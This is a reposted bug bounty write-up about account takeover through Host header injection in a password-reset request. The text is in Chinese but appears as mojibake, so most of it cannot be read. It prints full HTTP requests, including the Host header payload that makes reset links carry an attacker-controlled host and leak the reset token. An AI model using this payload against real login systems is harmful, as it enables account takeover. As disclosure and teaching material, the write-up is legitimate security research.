#  0023. è´¦æˆ·æ¥ç®¡æ¼æ´çš„æœ‰è¶£æ•…äº‹ã€è½¬è½½ã€‘   
Deepanshu  Rsec   2025-01-08 02:33  
  
#   
# æœ¬æ–‡ç« ä»…ç”¨ç½‘ç»œå®‰å…¨ç ”ç©¶å­¦ä¹ ï¼Œè¯·å‹¿ä½¿ç”¨ç›¸å…³æŠ€æœ¯è¿›è¡Œè¿æ³•çŠ¯ç½ªæ´»åŠ¨ã€‚  
  
**å£°æ˜ï¼šæœ¬æ–‡æ¬è¿è‡ªå›½å¤–äº’è”ç½‘ï¼Œå¦‚ä½ æ˜¯åŸä½œè€…ï¼Œè¯·è”ç³»æˆ‘ä»¬ï¼**  
  
**æ ‡ç­¾ï¼šè´¦æˆ·æ¥ç®¡**  
  
  
å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ Deepanshuï¼Œæ¥è‡ªå°åº¦çš„å®‰å…¨ç ”ç©¶é™¢ã€‚  
  
ç¥å¤§å®¶ä¸€åˆ‡é¡ºåˆ©ï¼ä»Šå¤©ï¼Œæˆ‘æƒ³åˆ†äº«ä¸€ä¸ªæœ‰è¶£çš„è´¦æˆ·æ¥ç®¡æ¼æ´ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/yKTOKd3ibs99wQ7SGTlsTicAKupOAJEJlAjmpjOVicr3ViceAfMBv8Q14VN4WUmFK3RuWjLjEdrDnn3FanYic5pp5CA/640?wx_fmt=jpeg&from=appmsg "")  
  
æˆ‘æ”¶åˆ°äº† hackerone.com ä¸Šçš„ä¸€ä¸ªç§äººæ¼æ´èµé‡‘è®¡åˆ’çš„é‚€è¯·ï¼Œè¯¥è®¡åˆ’çš„èŒƒå›´éå¸¸æœ‰é™ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªå·²æœ‰ 4 å¹´å†å²çš„è®¡åˆ’ï¼Œæœ€åˆå®ƒçœ‹èµ·æ¥å¾ˆå®‰å…¨ï¼Œä½†æˆ‘è¿˜æ˜¯æƒ³å°è¯•ä¸€ä¸‹ã€‚  
  
æˆ‘ç«‹å³è·³è½¬åˆ°æ£€æŸ¥å…¬å¸ä¸»ç½‘ç«™çš„â€œå¿˜è®°å¯†ç â€åŠŸèƒ½ã€‚  
  
æˆ‘åœ¨â€œå¿˜è®°å¯†ç â€å­—æ®µä¸­è¾“å…¥äº†æˆ‘çš„ç”µå­é‚®ä»¶å¹¶æ‹¦æˆªäº†è¯·æ±‚ã€‚  
```
POSTÂ /auth/realms/Redacted/login-actions/reset-credentials?session_code=AbcdiQqKwDBsJcdIjZpAFW3&client_id=account&tab_id=Abcdii7y9i3qwXs HTTP/1.1
Host: login.redacted.com
Cookie:Â AUTH_SESSION_ID=fc59cdd34026abcd;Â KC_RESTART=AbcdiSldUIiiaXNFs
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: https://login.redcated.com
Referer: https://login.redacted.com/auth/realms/redacted/login-actions/reset-credentials?client_id=account&tab_id=Abcdi3qwXs
Upgrade-Insecure-Requests:Â 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User:Â ?1
Te: trailers
Connection: close

username=testemail%40gmail.com
```  
  
æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œåœ¨å¿˜è®°å¯†ç è¯·æ±‚ï¼Œæˆ‘è„‘æµ·ä¸­é¦–å…ˆæƒ³åˆ°çš„æ˜¯æµ‹è¯• Host æ ‡å¤´æ³¨å…¥ã€‚Â   
  
æˆ‘åœ¨"Host"æ ‡å¤´ä¸­é™„åŠ äº†æˆ‘çš„Â   
burp collaborator UrlÂ   
ï¼Œå¦‚ä¸‹æ‰€ç¤º(  
login.redacted.comä¸ºåŸHostå€¼)ï¼š  
```
Host: login.redacted.com.BurpcollaboratorUrl.com
```  
  
æˆ‘å‘é€äº†è¯·æ±‚ï¼Œä½†ä»€ä¹ˆä¹Ÿæ²¡å‘ç”Ÿï¼Œå®ƒä¸èµ·ä½œç”¨ã€‚Â   
  
å°è¯•æ·»åŠ "X-forwarded-host"ç­‰æ ‡å¤´ï¼Œä½†æ²¡æœ‰èµ·ä½œç”¨ã€‚Â   
  
é‚£ä¹ˆç°åœ¨æ€ä¹ˆåŠï¼Ÿè®©æˆ‘ä»¬æ¢ä¸ªè§’åº¦æ€è€ƒã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/yKTOKd3ibs99wQ7SGTlsTicAKupOAJEJlAMZxLmicCp1fG4Ty6a5dpgpo1Dmx6ocXbztHpaNPSJ8RIEl8zGIfFnibA/640?wx_fmt=gif&from=appmsg "")  
  
ç»è¿‡å¤šæ¬¡å°è¯•ï¼Œæˆ‘å‘ç°å¦‚æœ Host æ ‡å¤´ä¸æ˜¯ä»¥"login.company.com"ç»“å°¾ï¼Œåˆ™åœ¨ Host æ ‡å¤´ä¸­æ·»åŠ ä»»ä½•å†…å®¹éƒ½å°†ä¸èµ·ä½œç”¨ï¼Œæ­£å¦‚æ‚¨ä¹‹å‰çœ‹åˆ°çš„ï¼Œæˆ‘åœ¨æœ«å°¾é™„åŠ äº†æˆ‘çš„Â   
burp collaborator Url  
ï¼Œä½†æ˜¯å®ƒä¸èµ·ä½œç”¨ã€‚  
  
å› æ­¤ç°åœ¨æˆ‘å°è¯•åœ¨ Host å¼€å¤´æ—¶ä½¿ç”¨ burp collaborator Linkï¼š  
```
Host: burpcollaboratorUrl.com.login.redacted.com
```  
  
å°è¯•è¿™ä¸ªï¼Œæˆ‘å¾—åˆ°äº†  
æˆ‘çš„ç”µå­é‚®ä»¶çš„  
å¿˜è®°å¯†ç é“¾æ¥ï¼Œå®ƒæ˜¯è¿™æ ·çš„ï¼š  
```
https://abc.burpcollaborator.login.redacted.com/auth/realms/login-actions/action-token?key=ey....
```  
  
ä½ å¯ä»¥åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œ  
å¯†ç é‡ç½®é“¾æ¥ä¸­åŒ…å«  
Â Burp Collaborator URL ä¸ä»¤ç‰Œï¼Œä½†å¦‚æœä½ ä»”ç»†è§‚å¯Ÿï¼ŒæœåŠ¡å™¨åˆ é™¤äº†  
Burp CollaboratorÂ   
URL  
ä¸­çš„".com"ï¼Œå¹¶åœ¨å…¶åé™„åŠ äº†å…¬å¸åŸŸåã€‚  
  
ä»æŠ€æœ¯ä¸Šè®²ï¼Œè¿™ä½¿å…¶æˆä¸ºæœªçŸ¥ä¸»æœºï¼Œå—å®³è€…ç‚¹å‡»å®ƒæ—¶å°†çœ‹åˆ°"æ— æ³•è®¿é—®ç«™ç‚¹"é”™è¯¯ã€‚  
å› æ­¤åŸºæœ¬ä¸Šï¼Œä½œä¸ºæ”»å‡»è€…ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡ Burp æœåŠ¡å™¨çš„ HTTP pingbackè·å–  
é‡ç½®å¯†ç ä»¤ç‰Œ  
ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs99wQ7SGTlsTicAKupOAJEJlAZHbdq3ZKicwSsQibUdUZfm0h2u5BAawCWxcD6xZlUB2yicTRykZtRHlVQ/640?wx_fmt=png&from=appmsg "")  
  
ä¸ºäº†ä½¿è¯·æ±‚æ­£å¸¸å·¥ä½œå¹¶çªƒå–ä»¤ç‰Œï¼Œæˆ‘ä»¬éœ€è¦å¦‚ä¸‹å¯†ç é‡ç½®é“¾æ¥ï¼š  
```
https://abc.burpcollaborator.com/auth/realms/login-actions/action-token?key=ey....
```  
  
æœ€åï¼Œæˆ‘å°è¯•åœ¨Hostä¸­æ·»åŠ ä¸€ä¸ªå†’å·ï¼ˆ:)ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š  
```
Host: burpcollaboratorurl.com:login.redacted.com
```  
  
æœ€ç»ˆè¯·æ±‚ç°åœ¨çœ‹èµ·æ¥åƒè¿™æ ·ï¼š  
```
POSTÂ /auth/realms/redacted/login-actions/reset-credentials?session_code=Jabcde HTTP/1.1
Host: abcd.burpcollaborator.com:login.redacted.com
Cookie:Â AUTH_SESSION_ID=abcdfc59cdd34026.keycloak-482-keycloak-aaalzz4;Â Lpaa1sXBBnfZiwyvqXMPW2E5/ikwW6fuTZCg+XlvBMY9yeptovpOaJM2xmkK0=; _ga=GA1.2.1343917884.1641975182;Â 
User-Agent: Mozilla/5.0Â (WindowsÂ NTÂ 10.0;Â Win64; x64; rv:95.0)Â Gecko/20100101 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: https://login.redacted.com
Referer: https://login.redacted.com/auth/realms/login-actions/reset-credentials
Upgrade-Insecure-Requests:Â 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User:Â ?1
Te: trailers
Connection: close

username=testemail%40gmail.com
```  
  
å‘é€è¯·æ±‚ï¼Œç„¶å BoooMï¼Â   
  
è¿™æ¬¡æˆ‘ç»•è¿‡äº†å®ƒï¼ŒæœåŠ¡å™¨æŒ‰ç…§æˆ‘ä»¬æƒ³è¦çš„æ–¹å¼å‘é€äº†é“¾æ¥ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs99wQ7SGTlsTicAKupOAJEJlAq9OXY4rLkWkWg2cicmeQib7LClBs4ZyibPyyg2SF8kgGAKnD2nw8TtIqw/640?wx_fmt=png&from=appmsg "")  
  
ç°åœ¨æ‚¨å¯ä»¥çœ‹åˆ° Burp åä½œè€… Url å¯ä»¥å·¥ä½œå¹¶ä¸”é™„åŠ äº†ä¸€ä¸ªä»¤ç‰Œã€‚  
  
Â å•å‡»å®ƒè¯·æ±‚Burp C  
ollaborator  
ï¼Œå¹¶ä¸”æˆ‘å¾—åˆ°äº† HTTP pingbackã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs99wQ7SGTlsTicAKupOAJEJlAL81PURaUicOLx0qSTeFAdZ5jv58ickfTzLDL4kXQTsxM3417Xibep167g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs99wQ7SGTlsTicAKupOAJEJlAuiayLmgicFalUwd3pLo8kDwyM9d3BHaPiccB0Q2vlkUicr7dibwOOibxvwyQ/640?wx_fmt=png&from=appmsg "")  
  
æˆåŠŸè·å–é‡ç½®ä»¤ç‰Œå¹¶å®Œå…¨èƒ½å¤Ÿæ¥ç®¡å—å®³è€…è´¦æˆ·ã€‚ ç°åœ¨æ‚¨å¯èƒ½æƒ³çŸ¥é“ä¸ºä»€ä¹ˆä»¥åŠå¦‚ä½•åœ¨ä¸»æœºæ ‡å¤´ä¸­ä½¿ç”¨è¯¥å†’å·":"æ ‡è®°ã€‚å¥½å§ï¼Œè¿™æ˜¯å…¬å¸å†…éƒ¨å›¢é˜Ÿçš„è§£é‡Šã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs99wQ7SGTlsTicAKupOAJEJlA53YxyVpbicOw2ZiazqErbxNDd94akeo2fLhceraiccTvuGpfkaTlXqPlw/640?wx_fmt=png&from=appmsg "")  
  
å…¬å¸åœ¨ä¸€å‘¨å†…ä¿®å¤äº†è¯¥é—®é¢˜å¹¶æˆäºˆäº†æˆ‘ä¸°åšçš„èµé‡‘ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs99wQ7SGTlsTicAKupOAJEJlALOESFoAbEiagOibdwbFAfmgzEianzP7uuz2gncFpC1oQviaPicTEiaYQkTNQ/640?wx_fmt=png&from=appmsg "")  
  
æˆ‘å¸Œæœ›ä½ ä»¬éƒ½å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œåˆ°é‚£æ—¶å†è§ï¼Œç›´åˆ°ä¸‹ä¸€ç¯‡æ–‡ç« ğŸ‘‹ã€‚  
  
Cheers!Â   
  
  
  
